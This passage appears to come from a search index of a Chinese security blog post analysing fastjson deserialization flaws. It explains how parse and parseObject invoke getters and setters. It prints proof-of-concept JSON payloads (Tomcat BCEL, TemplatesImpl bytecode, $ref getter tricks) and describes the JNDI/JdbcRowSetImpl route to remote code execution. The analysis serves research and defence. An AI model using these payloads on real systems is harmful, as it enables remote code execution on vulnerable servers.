\u7684 bytecodes \uff0c \u8fd9\u91cc \u7528 idea \u7684 \u65ad\u70b9 \u6765 dump \u6e90\u7801   \u5148 \u5c06 \u65ad\u70b9 \u4e0b \u5728   com / alibaba / fastjson / parser / deserializer / ASMDeserializerFactory . java # 80   \u751f\u6210 \u7684 bytecodes \u5728 code \u91cc \uff0c \u7528 \u6267\u884c \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u529f\u80fd \uff0c \u6267\u884c   ( new   FileOutputStream ( \" some . class \" ) ) . write ( code )   \u5373\u53ef \u751f\u6210","title":"( 2 ) . fastjson \u7684 \u6d41\u7a0b \u7b80\u4ecb"},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#3-fastjson-gettersetter","text":"\u7c7b\u4f3c Java \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u8fc7\u7a0b \u4f1a \u81ea\u52a8 \u8c03\u7528 readObject \u51fd\u6570 \uff0c fastjson \u8fd8\u539f \u5bf9\u8c61 \u65f6 \u4e5f \u4f1a \u81ea\u52a8 \u8c03\u7528 \u4ee5\u4e0b \u51e0\u4e2a \u51fd\u6570 \uff1a   \u65e0 \u53c2\u6570 \u7684 \u6784\u9020 \u51fd\u6570 \u6784\u9020\u51fd\u6570   \u7b26\u5408 \u6761\u4ef6 \u7b26\u5408\u6761\u4ef6 \u7684 getter \u51fd\u6570   \u7b26\u5408 \u6761\u4ef6 \u7b26\u5408\u6761\u4ef6 \u7684 setter \u51fd\u6570   \u8fd9\u91cc \u9700\u8981 \u533a\u522b \u7684 \u662f fastjson \u6240 \u4f7f\u7528 \u7684 parse \u51fd\u6570 \u548c parseObject \u51fd\u6570 \u6240 \u8c03\u7528 \u7684 \u51fd\u6570 \u6761\u4ef6 \u662f \u4e0d \u4e00\u6837 \u7684 \u3002 \uff08 ps \uff1a \u5e8f\u5217 \u5e8f\u5217\u5316 \u65f6\u4f1a \u8c03\u7528 \u6240\u6709 getters \uff09","title":"( 3 ) .     fastjson   \u81ea\u52a8 \u8c03\u7528 getter \u548c setter"},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#1-parse-parseobject","text":"\u6765\u770b \u4e00\u4e0b parseObject \u51fd\u6570   \u8fd9\u91cc parseObject \u51fd\u6570 \u4f1a \u9996\u5148 \u8c03\u7528   JSON . parse   \u51fd\u6570 \uff0c \u7136\u540e \u518d \u53bb \u8c03\u7528   toJSON   \u51fd\u6570 \u3002   \u8fd9\u91cc   toJSON   \u4f1a \u628a obj \u5957 \u4e00\u5c42   JSONObject   \u5bf9\u8c61 \uff0c \u4ed6 \u7684 \u5b9e\u73b0 \u65b9\u6cd5 \u662f \u5148 new \u4e00\u4e2a   JSONObject   \uff0c \u628a obj \u5bf9\u8c61 \u7ed9 \u586b\u5145 \u8fdb\u53bb \uff1b \u7136\u540e \u8c03\u7528   toJSONString   \u628a \u751f\u6210 \u7684   JSONObject   \u8f6c\u5316 \u4e3a json \u5b57\u7b26 \u5b57\u7b26\u4e32 \uff1b \u6700\u540e \u518d \u8c03\u7528   parse   \u51fd\u6570 \u5c06 \u8fd9\u4e2a json \u5b57\u7b26 \u5b57\u7b26\u4e32 \u7ed9 \u8fd8\u539f \u3002   \u8fd9\u91cc \u7684   toJSONString   \u662f \u6211\u4eec \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u4e00\u4e2a \u8fc7\u7a0b \uff0c \u4ed6\u4f1a \u53bb \u8c03\u7528 \u8fd9\u4e2a \u5bf9\u8c61 \u7684 \u6240\u6709 getters \uff0c \u4e5f \u5c31 \u610f\u5473 \u610f\u5473\u7740   parseObject   \u51fd\u6570 \u4f1a \u4e3b\u52a8 \u53bb \u8c03 getters \u548c setters \uff0c \u800c   parse   \u51fd\u6570 \u5219 \u4f1a \u8c03\u7528 \u8fd9\u4e2a \u5bf9\u8c61 \u7684 setters \u548c \u7b26\u5408 \u6761\u4ef6 \u7b26\u5408\u6761\u4ef6 \u7684 getters ( \u8fd9\u90e8 \u90e8\u5206 \u8fd9\u90e8\u5206 \u89c1 \u540e\u6587 ) \u3002   \u90a3\u4e48 \u4e5f \u5c31 \u610f\u5473 \u610f\u5473\u7740 \uff0c   parseObject   \u6bd4   parse   \u51fd\u6570 \u591a \u4e86 \u4e00\u4e2a \u8c03\u7528 \u6240\u6709 getters \u7684 \u5229\u7528 \u70b9 \u3002","title":"1 .   parse   \u548c   parseObject \u7684 \u533a\u522b"},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#2-parse","text":"\u63a5\u7740 \u6211\u4eec \u6765\u770b \u4e00\u4e0b   JSON . parse   \u51fd\u6570 \u81ea\u52a8 \u8c03\u7528 getters \u548c setters \u7684 \u903b\u8f91 \u3002   \u5148 \u6765\u770b \u4e00\u4e0b \u8c03\u7528 \u6d41\u7a0b \uff0c \u4ee5\u4e0b \u5206\u6790 fastjson \u7248\u672c 1.2 . 24   com / alibaba / fastjson / parser / deserializer / JavaBeanDeserializer . java # deserialze   \uff08 ps \uff1a \u8fd9\u91cc \u5f88 \u9e21 \u8d3c \u7684 \u628a deserialize \u7684 i \u7ed9 \u7701\u7565 \u4e86 \uff09   \u9996\u5148 \u662f \u7b2c 570 \u884c \u8c03\u7528 \u4e86 createInstance \u51fd\u6570 \uff0c \u8be5 \u51fd\u6570 \u5c06\u4f1a \u5bf9 \u5f53\u524d \u8fd8\u539f \u7684 \u7c7b \u8fdb\u884c \u5b9e\u4f8b \u5316 \uff0c \u8fd9\u91cc \u4f1a \u81ea\u52a8 \u8c03\u7528 \u65e0 \u53c2\u6570 \u7684 \u6784\u9020 \u51fd\u6570 \u6784\u9020\u51fd\u6570   \u5176\u6b21 \u662f \u7b2c 600 \u884c \u8c03\u7528 \u4e86 parseField \u51fd\u6570 \uff0c \u8be5 \u51fd\u6570 \u5c06 \u5bf9 \u6bcf\u4e2a \u7c7b \u5c5e\u6027 \u8fdb\u884c \u521d\u59cb \u521d\u59cb\u5316 ( \u6216 \u9012\u5f52 \u751f\u6210 \u65b0 \u7684 \u5bf9\u8c61 )   \u8ddf\u8fdb parseField \u51fd\u6570   \u8fd9\u91cc \u8c03\u7528 \u4e86   com / alibaba / fastjson / parser / deserializer / DefaultFieldDeserializer . java # parseField   \u51fd\u6570 \uff0c \u76f4\u63a5 \u770b \u5173\u952e \u5173\u952e\u70b9 \u7b2c 83 \u884c \uff0c \u8c03\u7528 \u4e86 setValue \u51fd\u6570   setValue \u51fd\u6570 \u5c31\u662f fastjson \u81ea\u52a8 \u8c03\u7528 getter \u548c setter \u7684 \u5173\u952e \u5173\u952e\u70b9   \u5982\u679c \u4e0d \u5b58\u5728 \u76f8\u5e94 \u7684 getter \u3001 setter \u3001 is \u51fd\u6570 \uff0c \u5219 \u5229\u7528 \u53cd\u5c04 \u673a\u5236 \u5c06 value \u8d4b\u503c \u5230 \u5f53\u524d \u7684 object \u4e0a \uff08 \u8fd9\u91cc \u5c31\u662f else \u90e8\u5206 \u505a \u7684 \u4e8b\u60c5 \uff09 \u3002   \u800c \u5f53 fieldInfo \u5b58\u5728 \u51fd\u6570 \u65f6 \uff0c \u5982\u679c \u540c\u65f6 \u5b58\u5728 getter \u548c setter \uff0c \u5219 \u8c03\u7528 setter \uff0c \u5982\u679c \u53ea \u5b58\u5728 getter \u5219 \u8c03\u7528 getter \u3002   \u8fd9\u91cc \u6211\u4eec \u5173\u6ce8 \u4e00\u4e0b fieldInfo \u7684 method \u662f \u600e\u4e48 \u586b\u5145 \u7684 \u5462 \uff1f \u8fd9\u91cc \u8981 \u770b   com / alibaba / fastjson / util / JavaBeanInfo . java # build   \u51fd\u6570 \uff0c ParserConfig \u5728   createJavaBeanDeserializer   \u51fd\u6570 \u4e2d \u4f1a \u8c03\u7528   JavaBeanInfo . build   \u51fd\u6570 \uff0c \u4ee5\u6b64 \u586b\u5145 fieldInfo \uff0c \u4e5f \u5c31\u662f \u6211\u4eec \u9700\u8981 \u5206\u6790 \u7684 \u51e0\u4e2a method \u3002   \u4e0d\u770b \u5177\u4f53 \u7684 \u4ee3\u7801 \uff0c \u5199 \u4e00\u4e0b \u7b5b\u9009 \u7684 \u6761\u4ef6 \uff1a   setter \u63d0\u53d6 \u6761\u4ef6 \uff1a   \u51fd\u6570 \u540d \u957f\u5ea6 \u5927\u4e8e \u7b49\u4e8e 4   \u975e \u9759\u6001 \u51fd\u6570   \u9650\u5236 \u8fd4\u56de \u7c7b\u578b \u4e3a void \u6216 \u5f53\u524d \u7c7b   \u51fd\u6570 \u53c2\u6570 \u51fd\u6570\u53c2\u6570 \u53ea\u6709 \u4e00\u4e2a   \u51fd\u6570 \u540d\u4ee5 set \u5f00\u5934 \uff0c \u7b2c\u56db \u56db\u4e2a \u7b2c\u56db\u4e2a \u5b57\u7b26 \u662f \u5927\u5199 \u6216\u8005   unicde   \u6216\u8005   _   \u6216\u8005 \u5b57\u6bcd f \uff1b \u5982\u679c \u51fd\u6570 \u540d \u957f\u5ea6 > = 5 \uff0c \u770b \u7b2c 5 \u4f4d \u5b57\u7b26 \u4e0d\u662f \u662f\u4e0d\u662f \u5927\u5199 \u7684   getter \u63d0\u53d6 \u6761\u4ef6 \uff1a   \u51fd\u6570 \u540d \u957f\u5ea6 \u5927\u4e8e \u7b49\u4e8e 4   \u975e \u9759\u6001 \u51fd\u6570   \u51fd\u6570 \u540d\u4ee5 get \u5f00\u5934 \uff0c \u7b2c\u56db \u56db\u4e2a \u7b2c\u56db\u4e2a \u5b57\u7b26 \u5927\u5199   \u51fd\u6570 \u53c2\u6570 \u51fd\u6570\u53c2\u6570 \u4e3a 0 \u4e2a   \u51fd\u6570 \u7684 \u8fd4\u56de \u7c7b\u578b \u4e3a Collection \u7684 \u5b50\u7c7b \u6216 \u672c\u8eab \u3001 Map \u7684 \u5b50\u7c7b \u6216 \u672c\u8eab \u3001 AtomicBoolean \u3001 AtomicInteger \u3001 AtomicLong   \u65e0 \u76f8\u5bf9 \u5e94 \u7684 setter \u51fd\u6570   \u7ecf\u8fc7 \u4e0a\u8ff0 \u7684 \u4e24\u4e2a \u6761\u4ef6 \u63d0\u53d6 \u540e \uff0c \u4fdd\u7559 \u4e86 \u7b26\u5408 \u6761\u4ef6 \u7b26\u5408\u6761\u4ef6 \u7684 getter \u548c setter \uff0c \u5e76 \u4e8e   com / alibaba / fastjson / parser / deserializer / FieldDeserializer . java # setValue   \u51fd\u6570 \u4e2d invoke \u8c03\u7528 \uff0c \u5c31\u662f \u5c31\u662f\u8bf4 \u4e5f\u5c31\u662f\u8bf4 \u5b9e\u73b0 \u4e86 \u7c7b\u4f3c \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u8fc7\u7a0b \u4e2d \u4e3b\u52a8 \u8c03\u7528 readObject \u51fd\u6570 \u7684 \u6548\u679c \u3002   \u77e5\u9053 \u4e86 \u4e0a\u8ff0 \u7684 \u6761\u4ef6 \uff0c \u5176\u5b9e \u6211\u4eec \u53ef\u4ee5 \u5229\u7528 \u4f20\u5165 \u67d0\u5b57 \u6bb5 \u7684 \u65b9\u5f0f \u6765 \u4e3b\u52a8 \u8c03\u7528 \u76f8\u5173 \u7b26\u5408 \u6761\u4ef6 \u7b26\u5408\u6761\u4ef6 \u7684 setter \u548c getter \u3002 \u4f8b\u5982 \u5728 Person \u91cc\u9762 \u6dfb\u52a0 \u4e00\u4e2a setTest \u51fd\u6570 \uff0c \u5e76 \u5728 \u9700\u8981 \u8f6c\u5316 \u7684 json \u4e2d \u6dfb\u52a0   \" test \" : 1   \uff0c \u5c06\u4f1a \u4e3b\u52a8 \u8c03\u7528   setTest   \u3002   \u6211\u4eec \u5728 \u5229\u7528   @ type   \u6784\u9020 \u6709 \u5371\u5bb3 \u7684 \u5229\u7528 \u94fe\u65f6 \uff0c \u4e3b\u8981 \u5c31\u662f \u67e5\u627e \u6709 \u5371\u5bb3 \u7684 \u65e0 \u53c2\u6570 \u7684 \u6784\u9020 \u51fd\u6570 \u6784\u9020\u51fd\u6570 \u3001 \u7b26\u5408 \u6761\u4ef6 \u7b26\u5408\u6761\u4ef6 \u7684 getter \u548c setter \u3002","title":"2 .   parse \u81ea\u52a8 \u8c03\u7528\u51fd\u6570 \u7684 \u4e3b\u8981 \u903b\u8f91"},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#3-parsegetters","text":"\u8fd9\u91cc \u7684 \u7a81\u7834 \u601d\u8def \u4e3b\u8981 \u6709 \u4e24\u4e2a \uff1a   tomcat   bcel \u7684 poc   threedream \u5e08\u5085 \u53d1\u73b0 \u7684   \u5f15\u7528   \u7684 \u65b9\u5f0f","title":"3 .   \u7a81\u7834 parse \u4e0d\u80fd \u8c03\u7528 \u6240\u6709 getters \u7684 \u9650\u5236"},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#tomcat-bcel-poc","text":"\u8fd9\u4e2a poc \u5de7\u5999 \u7684 \u5229\u7528 \u4e86   JSONObject . toString   \u51fd\u6570 \uff0c \u5148 \u6765 \u770b\u770b \u8fd9\u4e2a   toString   \u8fd9\u4e2a   toString   \u7ee7\u627f \u81ea   JSON   \u8fd9\u91cc \u4ed6 \u76f4\u63a5 \u8c03\u7528 \u4e86   toJSONString   \u51fd\u6570   \u770b\u5230 \u540e\u7eed \u4ed6 \u5c06 \u5f53\u524d \u8fd9\u4e2a JSONObject \u5b9e\u4f8b \u8fdb\u884c \u4e86 obj   to   str \u7684 \u64cd\u4f5c \uff0c \u4e5f \u5c31\u662f \u6211\u4eec \u4f7f\u7528 \u9759\u6001 \u51fd\u6570   JSON . toJSONString   \u6765 \u5e8f\u5217 \u5e8f\u5217\u5316 \u6570\u636e \u4e00\u6837 \uff0c \u8fd9\u91cc \u5c06\u4f1a \u8c03\u7528 \u5f53\u524d \u8fd9\u4e2a \u7c7b \u7684 \u6240\u6709 \u7b26\u5408 \u6761\u4ef6 \u7b26\u5408\u6761\u4ef6 \u7684 getters \uff08 \u8fd9\u91cc \u7684 \u6761\u4ef6 \u6bd4 \u8c03\u7528 parse \u65f6 \u5bbd\u677e \uff0c \u4ed6 \u5bf9 \u8fd4\u56de \u7c7b\u578b \u65e0 \u9650\u5236 \uff09 \u3002   \u90a3\u4e48 \u6211\u4eec \u53ea\u8981 \u5728 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u8fc7\u7a0b \u4e2d \uff0c \u627e\u5230 \u4e00\u5904 \u53ef\u4ee5 \u4f7f\u7528 JSONObject \u8c03\u7528 toString \u7684 \u5730\u65b9 \u5c31 \u53ef\u4ee5 \u4e86   com / alibaba / fastjson / parser / DefaultJSONParser . java # parseObject   \u8fd9\u91cc \u6709 \u4e00\u5904 \u5982\u679c \u5f53\u524d object \u4e3a JSONObject \u7c7b\u578b \u65f6 \uff0c \u5c06\u4f1a \u5bf9 \u5f53\u524d \u7684 \u8fd9\u4e2a key \u8c03\u7528   toString   \u51fd\u6570 \u3002 \u8fd9\u91cc \u5728 \u5904\u7406 \u7406\u8fc7 \u8fc7\u7a0b \u5904\u7406\u8fc7\u7a0b \u4e2d \uff0c \u6211\u4eec \u53ef\u4ee5 \u77e5\u9053 \u5982\u679c \u9047\u5230   {   \uff0c fastjson \u4f1a\u52a0 \u4e00\u5c42 JSONObject \u3002   \u90a3\u4e48 \uff0c \u6211\u4eec \u53ea \u9700\u8981 \u6784\u9020 \u4e00\u4e2a \u7c7b\u4f3c   { {   some   } :   x   }   \u8fd9\u79cd \u65b9\u5f0f \uff0c \u6b64\u65f6 \u7684 key \u4e3a   { }   ( \u4e5f \u5c31\u662f \u4e0b \u4e00\u5c42 \u7684 JSONObject ) \uff0c value \u4e3a   x   \u3002 \u6211\u4eec \u5c31 \u53ef\u4ee5 \u4f7f\u5f97 fastjson \u53bb \u8c03\u7528   key . toString   \u51fd\u6570 \uff0c \u8fd9\u4e2a   toString   \u7684 \u8fc7\u7a0b \u4e5f \u5c31\u662f \u5c06 key \u8c03\u7528   toJSONString   \u7684 \u8fc7\u7a0b \uff0c \u610f\u5473 \u610f\u5473\u7740 \u5c06\u4f1a \u8c03\u7528 \u5f53\u524d key \u5bf9\u8c61 \u7684 \u6240\u6709 getters \u3002 \u5230 \u8fd9\u91cc \u6211\u4eec \u5c31 \u53ef\u4ee5 \u4f7f parse \u51fd\u6570 \u62e5\u6709 \u4e0e parseObject \u4e00\u6837 \u7684 \u6267\u884c \u6548\u679c \uff0c \u4ee5 \u4e0b\u9762 \u7684 poc \u4e3a\u4f8b \u3002   {   / /   \u7b2c\u4e00 \u4e00\u5c42 \u7b2c\u4e00\u5c42 JSONObject \uff0c \u4ed6 \u7684 key \u4e3a \u53e6\u5916 \u4e00\u4e2a JSONObject   {   / /   \u4e0b \u4e00\u5c42 JSONObject \uff0c \u4ed6 \u7684 \u5185\u5bb9 \u5c06\u4f1a \u8c03\u7528 toJSONString   \" x \"   : {   / /   \u5177\u4f53 \u89e6\u53d1 \u70b9\u4e3a getConnection   \" @ type \"   :   \" org . apache . tomcat . dbcp . dbcp . BasicDataSource \"   ,   \" driverClassLoader \"   :   {   \" @ type \"   :   \" com . sun . org . apache . bcel . internal . util . ClassLoader \"   } ,   \" driverClassName \"   :   \" $ $ BCEL $ $ $ l $ 8b $ I $ A $ ... \"   }   } :   \" x \"   }   ;","title":"\u7b2c\u4e00\u79cd \uff1a Tomcat   BCEL   POC \u601d\u8def"},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#ref","text":"\u5f53 fastjson \u7248\u672c > = 1.2 . 36 \u65f6 \uff0c \u6211\u4eec \u53ef\u4ee5 \u4f7f\u7528   $ ref   \u7684 \u65b9\u5f0f \u6765 \u8c03\u7528 \u4efb\u610f \u7684 getter   \u4ee5 1.2 . 48 \u7248\u672c \u4e3a\u4f8b \uff0c \u9996\u5148 \u770b \u4e00\u4e0b \u9047\u5230   $ ref   \u662f \u600e\u4e48 \u5904\u7406 \u7684   com . alibaba . fastjson . parser . DefaultJSONParser # parseObject # 388   \u5f53 \u9047\u5230 \u5f15\u7528   $ ref   \u8fd9\u79cd \u65b9\u5f0f \uff0c \u4f1a \u589e\u52a0 \u4e00\u4e2a resolveTask \uff0c \u7559\u5728 parse \u7ed3\u675f \u540e \u8fdb\u884c \u5904\u7406   com . alibaba . fastjson . parser . DefaultJSONParser # handleResovleTask   \u8c03\u7528   JSONPath . eval   \uff0c \u5173\u4e8e JSONPath \u7684   \u4ecb\u7ecd   \u8fd9\u91cc \u7684 eval \u51fd\u6570 \u6700\u7ec8 \u4f1a \u53bb \u8c03\u7528   JSONPath . getPropertyValue   \u51fd\u6570 \uff08 \u8fd9\u91cc \u5176\u5b9e \u662f \u53ef\u4ee5 \u6839\u636e \u6211\u4eec \u4f20\u5165 \u7684 \u5185\u5bb9 \u53bb \u8c03\u7528 \u4e0d\u540c \u7684 Segement \uff0c \u6bd4\u5982 \u8fd9\u91cc \u7528 \u4e86   $ . value   \u7684 \u65b9\u5f0f \u4f7f\u7528 \u7684 \u662f PropertySegement \uff09   \u540e\u7eed \u5c31 \u4e0d \u8be6\u7ec6 \u7ec6\u5206 \u5206\u6790 \u8be6\u7ec6\u5206\u6790 \u4e86 \uff0c \u8fd9\u91cc \u5982\u679c \u5b58\u5728 \u76f8\u5e94 \u7684 getter \uff0c \u5c31 \u4f1a \u53bb invoke \u8fd9\u4e2a \u51fd\u6570 \uff1b \u5982\u679c \u6ca1\u6709 \uff0c \u90a3\u4e48 \u4f1a\u7528 \u5c31\u4f1a\u7528 \u53cd\u5c04 \u673a\u5236 \u53bb \u83b7\u53d6 \u5c5e\u6027 \u7684 \u503c \u3002   \u8fd9\u91cc \u4e3e\u4e2a \u4f8b\u5b50   json   =   \" { \"   +   \" \\ \" @ type \\ \" :   \\ \" org . apache . tomcat . dbcp . dbcp . BasicDataSource \\ \" , \"   +   \" \\ \" driverClassLoader \\ \" :   { \\ \" @ type \\ \" :   \\ \" com . sun . org . apache . bcel . internal . util . ClassLoader \\ \" } , \"   +   \" \\ \" driverClassName \\ \" :   \\ \" $ $ BCEL $ $ $ l $ 8b $ I $ A $ ... \\ \" , \"   +   \" \\ \" connection \\ \" : { \\ \" $ ref \\ \" :   \\ \" $ . connection \\ \" } \"   +   \" } \"   ;   \u4f1a \u53bb \u8c03\u7528   getConnection   \u51fd\u6570 \uff0c \u8fd9\u91cc \u4e5f \u7a81\u7834 \u4e86 parse \u5230 parseObject \u7684 \u6548\u679c","title":"\u7b2c\u4e8c\u79cd \uff1a $ ref \u70b9"},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#4-private","text":"\u8fd8\u6709 \u4e00\u70b9 \u9700\u8981 \u6ce8\u610f \u7684 \u662f \u9ed8\u8ba4 fastjon \u5728 \u8f6c\u5316 \u65f6 \uff0c \u5982\u679c \u6ca1\u6709 setter \u51fd\u6570 \uff0c \u800c\u662f \u4ee5 \u53cd\u5c04 \u673a\u5236 \u6765 \u8d4b\u503c \u7684 \u60c5\u51b5 \uff0c \u4f1a \u5ffd\u7565 private \u5c5e\u6027 \u7684 \u8f6c\u5316 \u3002 \u610f\u5473 \u610f\u5473\u7740 \u5982\u679c \u6211\u4eec \u5728 \u6784\u9020 \u8fc7\u7a0b \u4e2d \uff0c \u586b\u5145 \u8fdb\u53bb \u7684 \u5c5e\u6027 \u662f private \u7684 \u4e14 \u6ca1\u6709 setter \uff0c \u90a3\u4e48 \u5728 \u8f6c\u5316 \u8fc7\u7a0b \u4e2d\u662f \u4e0d\u4f1a \u88ab \u586b\u5165 \u8fd8\u539f \u540e \u7684 \u5bf9\u8c61 \u7684 \u3002 \u5982\u679c \u9700\u8981 \u5bf9 private \u5c5e\u6027 \u8fdb\u884c \u8f6c\u5316 \uff0c \u90a3\u4e48 \u9700\u8981 \u8bbe\u7f6e   Feature . SupportNonPublicField","title":"( 4 ) .   private \u5c5e\u6027"},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#0x02-exp","text":"\u76f8\u6bd4 \u4e8e Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u6784\u9020 \u7684 \u590d\u6742 \u590d\u6742\u6027 \uff0c fastjson \u5229\u7528 \u94fe \u4e3b\u8981 \u662f \u5bfb\u627e \u53ef \u5229\u7528 \u7684 getter \u3001 setter \u7b49 \uff0c \u5e38\u89c1 \u7684 \u51e0\u79cd POC \u5982\u4e0b \u6587 \u6240\u793a \uff1a","title":"0x02   EXP \u5206\u6790"},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#1-templatesimpl","text":"\u53c2\u8003 \uff1a   http : / / xxlegend . com / 2017 / 05 / 03 / title -% 20fastjson% 20% E8% BF% 9C% E7% A8% 8B% E5% 8F% 8D% E5% BA% 8F% E5% 88% 97% E5% 8C% 96poc% E7% 9A% 84% E6% 9E% 84% E9% 80% A0% E5% 92% 8C% E5% 88% 86% E6% 9E% 90 /   \u6839\u636e \u524d\u9762 \u7684 \u5206\u6790 \uff0c \u6211\u4eec \u9700\u8981 \u627e\u5230 \u53ef\u4ee5 \u5229\u7528 \u7684 \u6784\u9020 \u51fd\u6570 \u6784\u9020\u51fd\u6570 \u3001 setter \u6216 getter \u51fd\u6570 \u3002 \u5728 \u5206\u6790 Commons - Collections \u7cfb\u7edf \u7684 \u5229\u7528 \u94fe\u65f6 \uff0c \u63d0\u5230 \u8fc7 templatesimpl \u7684 \u6267\u884c \u65b9\u5f0f \uff0c \u901a\u8fc7 \u8f7d\u5165 bytecodes \u7684 \u65b9\u5f0f \u6765 \u8fbe\u5230 \u4efb\u610f \u4ee3\u7801 \u6267\u884c \u4ee3\u7801\u6267\u884c \u7684 \u6548\u679c ( \u5177\u4f53 \u4e0d\u518d \u5206\u6790 ) \u3002   \u5176\u4e2d \u89e6\u53d1 \u8f7d\u5165 \u7684 \u51fd\u6570 \u4e3a   newTransformer   \u51fd\u6570 \uff0c \u800c \u5f88\u5de7 \u7684 \u662f \uff0c templatesimpl \u5b58\u5728 \u4e00\u4e2a getter \u8c03\u7528 \u4e86 \u8be5 \u51fd\u6570   \u90a3\u4e48 \u5f88 \u660e\u663e \uff0c \u6211\u4eec \u53ef\u4ee5 \u76f4\u63a5 \u586b\u5165   outputProperties   \u7684 \u65b9\u6cd5 \u6765 \u89e6\u53d1   getOutputProperties   \uff08 \u4ed6 \u6070\u5de7 \u65e0 setter \uff0c \u8fd4\u56de \u8fd4\u56de\u503c \u4e5f \u7b26\u5408 \u6761\u4ef6 \u7b26\u5408\u6761\u4ef6 \uff09 \u3002 \u4f46\u662f \u6709 \u4e00\u4e2a \u95ee\u9898 \u662f \u6211\u4eec \u9700\u8981 \u586b\u5145 \u7684 \u7c7b \u5c5e\u6027 \u90fd \u662f private \u7c7b\u578b \uff0c \u8981 \u60f3 \u6267\u884c \u8be5 \u5229\u7528 \u94fe \uff0c \u9700\u8981 \u5728 \u8c03\u7528 parseObject \u51fd\u6570 \u65f6 \u586b\u5165   Feature . SupportNonPublicField   \u3002 \u4ee5\u4e0b \u56fe\u4e3a\u4f8b \uff0c \u5c06 \u8c03\u7528 \u8ba1\u7b97 \u7b97\u5668 \u8ba1\u7b97\u5668   String   jsonString   =   \" { \\ \" @ type \\ \" : \\ \" com . sun . org . apache . xalan . internal . xsltc . trax . TemplatesImpl \\ \" , \"   +   \" \\ \" _ name \\ \" : \\ \" goodjob \\ \" , \\ \" _ tfactory \\ \" : { } , \"   +   \" \\ \" _ bytecodes \\ \" : [ \\ \" yv66vgAAADQAOgoAA ... \\ \" ] , \"   +   \" \\ \" _ outputProperties \\ \" : null } \"   ;   \u8fd9\u91cc \u7684 bytecodes \u53ef\u4ee5 \u7528 ysoserial \u5de5\u5177 \u6765 \u751f\u6210 \u3002 \u5728 \u6784\u9020 payload \u7684 \u65f6\u5019 \uff0c \u9700\u8981 \u6ce8\u610f \u7684 \u662f   _ tfactory   \u5fc5\u987b \u586b \u4e0a \uff0c \u56e0\u4e3a \u5728 \u6267\u884c \u8fc7\u7a0b \u4e2d \uff0c \u5982\u679c \u5b83 \u4e3a null \uff0c \u4f1a \u62a5\u9519 \u65e0\u6cd5 \u8fdb\u5165 \u8f7d\u5165 bytecodes \u7684 \u6b65\u9aa4 \u3002 \u975e\u5e38 \u597d \u7684 \u662f \uff0c \u6211\u4eec \u53ea\u8981 \u586b \u4e0a   _ tfactory : { }   \uff0c fastjson \u4f1a \u81ea\u52a8 \u5e2e \u6211\u4eec \u8c03\u7528 TransformerFactoryImpl \uff08 _ tfactory \u7684 \u7c7b \uff09 \u7684 \u65e0\u53c2 \u6784\u9020 \u51fd\u6570 \u6784\u9020\u51fd\u6570 \u8fdb\u884c \u5b9e\u4f8b \u5316 \u3002   \\ _   \u5728 smartMatch \u51fd\u6570 \u88ab \u66ff\u6362 \u4e3a\u7a7a \u3002   \u9664\u6b64 \u4e4b\u5916 \u9664\u6b64\u4e4b\u5916 \uff0c byte [ ] \u7c7b\u578b \u5728 fastjson \u8f6c\u5316 \u4e2d\u4f1a \u88ab base64 \u7f16\u7801   \u6240\u4ee5 payload \u4e2d\u662f \u957f\u4e32 \u4e00\u957f\u4e32 base64 \u7684 \u5b57\u4e32 \u3002   \u53ef\u4ee5 \u770b\u5230 \u8fd9\u4e2a poc \u5176\u5b9e \u9650\u5236 \u8fd8\u662f \u633a\u5927 \u7684 \uff0c \u9700\u8981 fastjson   parseObject \u586b\u4e0a \u65f6\u586b\u4e0a   Feature . SupportNonPublicField   \u624d \u53ef\u4ee5 \u3002","title":"( 1 ) .   templatesimpl"},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#2-jndi","text":"\u6211\u4eec \u90fd \u77e5\u9053 \u5982\u679c JNDI \u7684 lookup \u51fd\u6570 \u53c2\u6570 \u51fd\u6570\u53c2\u6570 \u503c \u53ef\u63a7 \uff0c \u90a3\u4e48 \u6211\u4eec \u53ef\u4ee5 \u5229\u7528 JNDI   Reference \u7684 \u65b9\u6cd5 \u52a0\u8f7d \u8fdc\u7a0b \u4ee3\u7801 \u8fbe\u6210 RCE \u5229\u7528 \u3002 \u6240\u4ee5 \u6839\u636e \u524d\u9762 \u7684 \u5206\u6790 \uff0c \u5982\u679c \u6211\u4eec \u53ef\u4ee5 \u5728   \u65e0\u53c2 \u6784\u9020 \u51fd\u6570 \u6784\u9020\u51fd\u6570   \u3001   \u7b26\u5408 \u6761\u4ef6 \u7b26\u5408\u6761\u4ef6 \u7684 setter   \u3001   \u7b26\u5408 \u6761\u4ef6 \u7b26\u5408\u6761\u4ef6 \u7684 getter   \u91cc \u53d1\u73b0 \u4e00\u4e2a \u53ef\u63a7 \u7684 lookup \u51fd\u6570 \uff0c \u6211\u4eec \u5c31 \u53ef\u4ee5 \u5229\u7528 JNDI \u7684 \u6ce8\u5165 \u65b9\u6cd5 \u6765 \u8fbe\u6210 \u5229\u7528 \u3002","title":"( 2 ) .   \u57fa\u4e8e JNDI \u7684 \u5229\u7528"},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#jdbcrowsetimpl","text":"JdbcRowSetImpl \u5bf9\u8c61 \u53ef\u4ee5 \u88ab \u6211\u4eec \u7528\u505a \u4e0a\u8ff0 \u7684 \u5229\u7528 \uff0c \u6765\u770b \u4e00\u4e0b \u4ed6 \u7684 \u4ee3\u7801   \u8fd9\u6b21 \u51fa \u95ee\u9898 \u7684 \u5730\u65b9 \u5728\u4e8e setAutoCommit \u51fd\u6570 \uff0c \u8be5 \u51fd\u6570 \u8c03\u7528 \u51fd\u6570\u8c03\u7528 \u4e86 connect \u51fd\u6570 \u6765 \u91cd\u65b0 \u53d1\u8d77 \u4e00\u4e2a jdbc \u7684 \u8fde\u63a5   \u5728 connect 